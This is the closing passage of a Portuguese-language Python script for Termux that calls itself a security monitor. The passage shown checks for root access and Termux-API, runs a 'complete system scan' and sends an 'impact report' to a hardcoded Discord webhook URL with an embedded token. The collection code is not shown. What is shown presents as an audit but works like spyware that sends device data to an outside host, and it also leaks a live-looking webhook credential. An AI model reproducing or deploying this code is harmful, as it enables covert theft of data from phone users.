        print("\033[1;31m[‚úó] ERRO: Este script deve ser executado no Termux!\033[0m")
        sys.exit(1)
    
    # Instala depend√™ncias
    install_dependencies()
    
    # Verifica Termux-API
    termux_api_available = check_termux_api()
    
    # Webhook do Discord
    WEBHOOK_URL = "https://discord.com/api/webhooks/1424954664687894580/JcxKPVL-DfcXfAE4gMpua1MwuBpcQSF75Pwp8PZEQA3mNUzzRyrIDLc7MbJjUS0FaLmD"
    
    if WEBHOOK_URL == "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI":
        print("\033[1;31m[‚úó] Configure o WEBHOOK_URL no c√≥digo!\033[0m")
        sys.exit(1)
    
    try:
        print("\n\033[1;36m[üöÄ] INICIANDO VARREdura COMPLETA DO SISTEMA...\033[0m")
        monitor = TermuxSecurityMonitor(WEBHOOK_URL)
        
        print("\n\033[1;33m[üì§] ENVIANDO RELAT√ìRIO PARA DISCORD...\033[0m")
        success = monitor.send_impact_report()
        
        if success:
            print("\n\033[1;32m" + "="*70 + "\033[0m")
            print("\033[1;32m            AUDITORIA CONCLU√çDA COM SUCESSO!           \033[0m")
            print("\033[1;32m" + "="*70 + "\033[0m")
            print(f"\033[1;36m[üìã] Session ID: {monitor.session_id}\033[0m")
            print(f"\033[1;36m[üîê] Root Access: {'YES' if monitor.has_root else 'NO'}\033[0m")
            print(f"\033[1;36m[üì±] Termux-API: {'ACTIVE' if monitor.termux_api_available else 'INACTIVE'}\033[0m")
            print("\033[1;33m[‚ö†Ô∏è] Relat√≥rio enviado para o Discord!\033[0m")
        else:
            print("\n\033[1;31m[‚úó] Falha no envio do relat√≥rio.\033[0m")
            
    except Exception as e:
        print(f"\n\033[1;31m[üí•] ERRO CR√çTICO: {e}\033[0m")
        import traceback
        traceback.print_exc()
    
    # Efeito final
    print("\n\033[1;35m[üéØ] Execute novamente para nova auditoria!\033[0m")
